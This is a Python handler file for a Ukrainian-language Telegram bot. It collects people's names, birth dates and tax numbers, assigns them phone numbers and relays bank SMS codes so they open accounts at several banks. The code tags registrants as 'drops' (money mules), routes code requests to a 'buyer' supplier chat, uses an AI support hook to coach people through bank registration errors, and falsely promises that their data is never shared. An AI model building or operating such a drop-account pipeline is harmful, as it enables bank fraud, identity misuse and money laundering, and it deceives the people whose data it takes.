from aiogram import Router, F, Bot
from aiogram.filters import CommandStart
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove, FSInputFile, ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from bot.config import ADMIN_ID, BANK_TEMPLATES, get_template_photo
import bot.database as db
import re

router = Router()

def get_client_idle_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(text="🚀 Почати верифікацію")
            ],
            [
                KeyboardButton(text="ℹ️ Інструкція"),
                KeyboardButton(text="📞 Підтримка")
            ]
        ],
        resize_keyboard=True
    )

class RegistrationStates(StatesGroup):
    waiting_pib_dob = State()
    waiting_ipn = State()
    waiting_confirm = State()

def clean_pib(pib: str) -> str:
    # Видаляємо допоміжні фрази на кшталт "дата народження", "д.н." тощо
    pib = re.sub(r'(?i)\b(дата\s+народження|д\.н\.|дн|народження|нар\.?|р\.н\.?)\b', '', pib)
    pib = re.sub(r'^[^\w\s]+|[^\w\s]+$', '', pib)
    pib = re.sub(r'\s+', ' ', pib)
    return pib.strip()

@router.message(CommandStart(), F.chat.type == "private")
async def cmd_start(message: Message, state: FSMContext):
    """Обробник команди /start для клієнта"""
    if message.from_user.id == ADMIN_ID:
        from bot.handlers.admin import get_admin_keyboard
        await message.answer(
            "Привіт, Адміне!\n\n"
            "Оберіть потрібну дію на клавіатурі нижче:",
            reply_markup=get_admin_keyboard()
        )
        return

    # Перевіряємо, чи є вже активна сесія у робочому статусі
    client_id = message.from_user.id
    existing_session = await db.get_session(client_id)
    if existing_session and existing_session['status'] in ('registered', 'number_assigned', 'waiting_code'):
        await message.answer(
            "Ваш запит вже обробляється або лінія активна. Будь ласка, очікуйте вказівок адміна.",
            reply_markup=get_client_idle_keyboard()
        )
        return

    await state.clear()
    
    await message.answer(
        "Вітаємо! Для початку верифікації натисніть кнопку **🚀 Почати верифікацію** на клавіатурі нижче.\n\n"
        "Ви також можете прочитати інструкцію за допомогою кнопки **ℹ️ Інструкція**.",
        parse_mode="Markdown",
        reply_markup=get_client_idle_keyboard()
    )

@router.message(RegistrationStates.waiting_pib_dob, F.chat.type == "private")
async def process_pib_dob(message: Message, state: FSMContext):
    """Отримання ПІБ та Дати народження в одному повідомленні з валідацією наявності дати"""
    pib_dob = message.text.strip()
    
    # Спочатку шукаємо дату народження за регулярним виразом
    # Підтримує формати: DD.MM.YYYY, DD/MM/YYYY, DD-MM-YYYY, DD.MM.YY та версії з пробілами
    date_match = re.search(r'\b(\d{1,2}[\.\-\/]\d{1,2}[\.\-\/]\d{2,4})\b', pib_dob)
    if not date_match:
        # Спробуємо також варіант через пробіли, наприклад, "12 05 1998"
        date_match = re.search(r'\b(\d{1,2}\s+\d{1,2}\s+\d{4})\b', pib_dob)
        
    if not date_match:
        await message.answer(
            "Вибачте, ви не вказали Дату Народження.\n"
            "Будь ласка, напишіть Ваші ПІБ та Дату Народження разом:\n\n"
            "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
            "(обов'язково пишіть все в одному повідомленні)",
            parse_mode="Markdown"
        )
        return
        
    dob_raw = date_match.group(1)
    dob = dob_raw.replace(' ', '.') # Перетворюємо пробіли на крапки для стандартизації
    
    # Вилучаємо дату з повідомлення, щоб отримати тільки ПІБ
    pib_raw = pib_dob.replace(dob_raw, '').strip()
    pib = clean_pib(pib_raw)
    
    # Валідуємо, чи залишилось хоча б 2 слова для ПІБ
    if len(pib.split()) < 2 or len(pib) < 5:
        await message.answer(
            "Будь ласка, введіть Ваші ПІБ повністю та Дату Народження:\n\n"
            "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
            "(обов'язково пишіть все в одному повідомленні)",
            parse_mode="Markdown"
        )
        return
        
    # Зберігаємо розпарсені дані окремо
    await state.update_data(pib=pib, dob=dob)
    
    # Крок 2: Запитуємо ІПН та відразу надсилаємо роз'яснення
    await message.answer("Також напишіть Ваш ІПН будь ласка?")
    await message.answer(
        "Запитуємо ІПН виключно для перевірки через офіційні державні реєстри:\n"
        "• щоб переконатися, що немає відкритих проваджень\n"
        "• щоб перевірити, чи не було раніше співпраці з нашою компанією\n\n"
        "Важливо:\n"
        "Дані що Ви надаєте ніколи не будуть передані третім особам!"
    )
    await state.set_state(RegistrationStates.waiting_ipn)

@router.message(RegistrationStates.waiting_ipn, F.chat.type == "private")
async def process_ipn(message: Message, state: FSMContext):
    """Отримання ІПН та перехід до підтвердження даних"""
    ipn = message.text.strip()
    if not ipn.isdigit() or len(ipn) != 10:
        await message.answer("ІПН має складатися рівно з 10 цифр. Будь ласка, перевірте та спробуйте ще раз:")
        return

    await state.update_data(ipn=ipn)
    data = await state.get_data()
    pib = data['pib']
    dob = data['dob']
    
    # Виводимо повідомлення підтвердження
    confirm_text = (
        f"**Перевірте ваші дані:**\n"
        f"• **ПІБ:** {pib}\n"
        f"• **ІПН:** {ipn}\n"
        f"• **Дата народження:** {dob}"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Підтвердити та надіслати", callback_data="confirm_reg"),
            InlineKeyboardButton(text="🔄 Заповнити заново", callback_data="restart_reg")
        ]
    ])
    
    await message.answer(confirm_text, reply_markup=keyboard, parse_mode="Markdown")
    await state.set_state(RegistrationStates.waiting_confirm)

@router.callback_query(F.data == "confirm_reg")
async def handle_confirm_reg(callback: CallbackQuery, state: FSMContext, bot: Bot):
    """Обробник підтвердження реєстраційних даних"""
    current_state = await state.get_state()
    if current_state != RegistrationStates.waiting_confirm:
        await callback.answer("Сесія реєстрації застаріла або вже підтверджена.", show_alert=True)
        return

    data = await state.get_data()
    pib = data.get('pib')
    dob = data.get('dob')
    ipn = data.get('ipn')
    
    if not pib or not dob or not ipn:
        await callback.answer("Дані не знайдено. Будь ласка, почніть спочатку з /start.", show_alert=True)
        await callback.message.edit_reply_markup(reply_markup=None)
        await state.clear()
        return

    await state.clear()

    # Формуємо дані для адмін-панелі та Telegram повідомлення
    client_data = f"ІПН: {ipn}\nПІБ: {pib}\nДата: {dob}"
    username = callback.from_user.username
    if username:
        client_data += f"\n\nДроп - @{username}"
        
    client_id = callback.from_user.id
    username_db = username or "Немає юзернейму"

    # Створюємо нову сесію в базі даних
    await db.create_or_update_session(client_id, username_db, client_data)
    
    # Забираємо кнопки з повідомлення підтвердження
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer("Дані успішно прийнято! Номер буде надіслано до чату протягом 2-х хвилин.")
    await callback.answer("Дані підтверджено!")

    # Отримуємо унікальні назви банків для вибору адміном
    unique_banks = await db.get_unique_banks()
    
    if not unique_banks:
        await bot.send_message(
            chat_id=ADMIN_ID,
            text=(
                f"Новий клієнт на верифікацію!\n"
                f"• Telegram: @{username} (ID: {client_id})\n"
                f"• Дані:\n```\n{client_data}\n```\n\n"
                f"Попередження: немає доступних ліній/банків у базі! Використайте /import."
            ),
            parse_mode="Markdown"
        )
        return
        
    # Створюємо кнопки вибору банків
    keyboard_buttons = []
    row = []
    for bank in unique_banks:
        button_text = f"[ ] {bank}"
        callback_data = f"toggle_{client_id}_{bank}"
        row.append(InlineKeyboardButton(text=button_text, callback_data=callback_data))
        if len(row) == 2:
            keyboard_buttons.append(row)
            row = []
    if row:
        keyboard_buttons.append(row)
        
    # Додаємо керівні кнопки
    keyboard_buttons.append([InlineKeyboardButton(text="Зберегти та продовжити", callback_data=f"savebanks_{client_id}")])
    keyboard_buttons.append([InlineKeyboardButton(text="Відхилити запит", callback_data=f"reject_{client_id}")])
    
    markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
    
    # Сповіщаємо адміна в Telegram
    admin_msg = (
        f"Новий клієнт на верифікацію!\n"
        f"• Telegram: @{username} (ID: {client_id})\n"
        f"• Дані:\n```\n{client_data}\n```\n"
        f"Оберіть банки, які має пройти клієнт:"
    )
    
    await bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=markup, parse_mode="Markdown")

@router.callback_query(F.data == "restart_reg")
async def handle_restart_reg(callback: CallbackQuery, state: FSMContext):
    """Обробник скасування та заповнення анкети заново"""
    current_state = await state.get_state()
    if current_state != RegistrationStates.waiting_confirm:
        await callback.answer("Сесія реєстрації застаріла.", show_alert=True)
        return
        
    await state.clear()
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer(
        "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження",
        reply_markup=ReplyKeyboardRemove()
    )
    await state.set_state(RegistrationStates.waiting_pib_dob)
    await callback.answer("Почнемо заново!")

@router.message(F.chat.type == "private", F.text & F.text.startswith('/'))
async def handle_custom_bank_commands(message: Message):
    """Обробник кастомних команд завантаження додатків та інструкцій реєстрації"""
    cmd = message.text.strip().lower()
    
    # Інструкції реєстрації, які використовуються додатково
    manual_instructions = {
        "/екорег": "Анкетні дані в самому ЕкоБанку виставляти як на фото! Слово п...",
        "/аморег": "Анкетні дані в самому АмоБанку виставляти як на фото..."
    }
    
    if cmd in manual_instructions:
        photo_path = get_template_photo(cmd)
        if photo_path:
            await message.answer_photo(photo=FSInputFile(photo_path), caption=manual_instructions[cmd])
        else:
            await message.answer(manual_instructions[cmd])
        return

    # Перевіряємо по словнику BANK_TEMPLATES
    for key, val in BANK_TEMPLATES.items():
        if val['command'].lower() == cmd:
            photo_path = get_template_photo(key)
            if photo_path:
                await message.answer_photo(photo=FSInputFile(photo_path), caption=val['text'])
            else:
                await message.answer(val['text'])
            return

@router.message(F.text == "🚀 Почати верифікацію", F.chat.type == "private")
async def btn_start_verification(message: Message, state: FSMContext):
    client_id = message.from_user.id
    existing_session = await db.get_session(client_id)
    if existing_session and existing_session['status'] in ('registered', 'number_assigned', 'waiting_code'):
        await message.answer(
            "Ваш запит вже обробляється або лінія активна. Будь ласка, очікуйте вказівок адміна.",
            reply_markup=get_client_idle_keyboard()
        )
        return

    await state.clear()
    
    await message.answer(
        "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження\n\n"
        "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
        "(обов'язково пишіть все в одному повідомленні)",
        reply_markup=ReplyKeyboardRemove()
    )
    await state.set_state(RegistrationStates.waiting_pib_dob)

@router.message(F.text == "ℹ️ Інструкція", F.chat.type == "private")
async def btn_client_instruction(message: Message):
    await message.answer(
        "ℹ️ **Як працює верифікація:**\n\n"
        "1. Натисніть кнопку **🚀 Почати верифікацію** та введіть свої дані (ПІБ, дату народження, ІПН).\n"
        "2. Очікуйте, поки менеджер призначить вам телефонний номер для першого банку.\n"
        "3. Після отримання номера пройдіть реєстрацію в додатку відповідного банку.\n"
        "4. Коли банк надішле SMS, натисніть кнопку **«Запросити SMS-код»** у цьому чаті, і ми надішлемо вам код.\n"
        "5. Після проходження одного банку менеджер може видати номер для наступного.",
        parse_mode="Markdown"
    )

@router.message(F.text == "📞 Підтримка", F.chat.type == "private")
async def btn_client_support(message: Message):
    await message.answer(
        "📞 **Підтримка:**\n\n"
        "Якщо у вас виникли запитання, зверніться до менеджера, який надав вам посилання на цього бота.",
        parse_mode="Markdown"
    )

@router.message(F.chat.type == "private", F.text & ~F.text.startswith('/'))
async def handle_client_data_manual(message: Message, state: FSMContext, bot: Bot):
    """Обробник повідомлень поза станами введення даних (захист від флуду + ШІ підтримка)"""
    client_id = message.from_user.id
    
    # Перевеяємо, чи є вже активна сесія у будь-котрому робочому статусі
    existing_session = await db.get_session(client_id)
    if existing_session and existing_session['status'] in ('registered', 'number_assigned', 'waiting_code'):
        # Показати статус "typing", щоб користувач знав, що бот обробляє запит
        await bot.send_chat_action(chat_id=client_id, action="typing")
        
        # Отримуємо додатковий контекст для ШІ
        line_id = existing_session['line_id']
        line_info = await db.get_line(line_id) if line_id else None
        current_bank_name = line_info['bank'] if line_info else None
        client_data = existing_session['client_data']
        
        from bot.openai_client import get_support_response
        response = await get_support_response(
            user_text=message.text,
            client_data=client_data,
            current_bank_name=current_bank_name
        )
        await message.answer(response)
        return

    # Якщо користувач не у стані анкетування, пропонуємо йому почати
    await message.answer(
        "Для початку верифікації скористайтеся кнопками нижче або напишіть **/start**.", 
        parse_mode="Markdown",
        reply_markup=get_client_idle_keyboard()
    )

@router.message(F.chat.type == "private", F.photo)
async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
    """Обробник скріншотів/зображень від користувача (ШІ розпізнавання помилок)"""
    client_id = message.from_user.id
    
    # Перевіряємо, чи є вже активна сесія
    existing_session = await db.get_session(client_id)
    if existing_session and existing_session['status'] in ('registered', 'number_assigned', 'waiting_code'):
        # Беремо фото найкращої якості
        photo = message.photo[-1]
        
        await bot.send_chat_action(chat_id=client_id, action="typing")
        
        # Отримуємо додатковий контекст для ШІ
        line_id = existing_session['line_id']
        line_info = await db.get_line(line_id) if line_id else None
        current_bank_name = line_info['bank'] if line_info else None
        client_data = existing_session['client_data']
        
        import io
        photo_file = await bot.get_file(photo.file_id)
        photo_bytes = io.BytesIO()
        await bot.download_file(photo_file.file_path, photo_bytes)
        photo_data = photo_bytes.getvalue()
        
        from bot.openai_client import get_support_response
        response = await get_support_response(
            user_text=message.caption,
            image_bytes=photo_data,
            client_data=client_data,
            current_bank_name=current_bank_name
        )
        await message.answer(response)
        return
        
    await message.answer(
        "Для початку верифікації скористайтеся кнопками нижче або напишіть **/start**.", 
        parse_mode="Markdown",
        reply_markup=get_client_idle_keyboard()
    )

@router.callback_query(F.data == "request_code")
async def process_request_code(callback: CallbackQuery, bot: Bot):
    """Обробник натискання кнопки 'Запросити SMS-код' клієнтом"""
    client_id = callback.from_user.id
    
    session = await db.get_session(client_id)
    if not session or session['status'] == 'completed':
        await callback.answer("Сесія не знайдена або вже завершена.", show_alert=True)
        # Прибираємо кнопку, бо сесія завершена
        await callback.message.edit_reply_markup(reply_markup=None)
        return
        
    line_id = session['line_id']
    if not line_id:
        await callback.answer("Вам ще не призначено лінію.", show_alert=True)
        return

    line_info = await db.get_line(line_id)
    bank_name = line_info['bank'] if line_info else "Невідомий банк"

    # Перевіряємо чи це повторний запит коду
    is_retry = session['status'] == 'waiting_code'

    # Оновлюємо статус сесії на очікування коду
    await db.set_session_status(client_id, 'waiting_code')

    # Повідомляємо клієнта (НЕ видаляючи кнопку, щоб була змога запросити ще раз)
    # Отримуємо шаблони повідомлень для скупщика (Giver) з бази даних
    giver_format = await db.get_setting("giver_request_format", "Запрос {line_id} {bank_name}")
    giver_retry_format = await db.get_setting("giver_request_retry_format", "Запрос {line_id} {bank_name} (ПОВТОРНО)")

    if is_retry:
        await callback.message.answer("Запит на код відправлено постачальнику. Будь ласка, очікуйте.")
        await callback.answer("Повторний запит відправлено!")
        try:
            giver_msg = giver_retry_format.format(line_id=line_id, bank_name=bank_name)
        except Exception:
            giver_msg = f"Запрос {line_id} {bank_name} (ПОВТОРНО)"
    else:
        await callback.message.answer("Запит на код відправлено постачальнику. Будь ласка, очікуйте, код прийде сюди.")
        await callback.answer("Запит відправлено!")
        try:
            giver_msg = giver_format.format(line_id=line_id, bank_name=bank_name)
        except Exception:
            giver_msg = f"Запрос {line_id} {bank_name}"

    # Надсилаємо запит постачальнику кодів (Giver)
    from bot.config import GIVER_CHAT_ID
    try:
        await bot.send_message(chat_id=GIVER_CHAT_ID, text=giver_msg)
    except Exception as e:
        # Якщо не вдалося надіслати гіверу, повідомляємо адміна
        await bot.send_message(
            chat_id=ADMIN_ID,
            text=f"Помилка надсилання запиту гіверу (Line {line_id}): {str(e)}"
        )
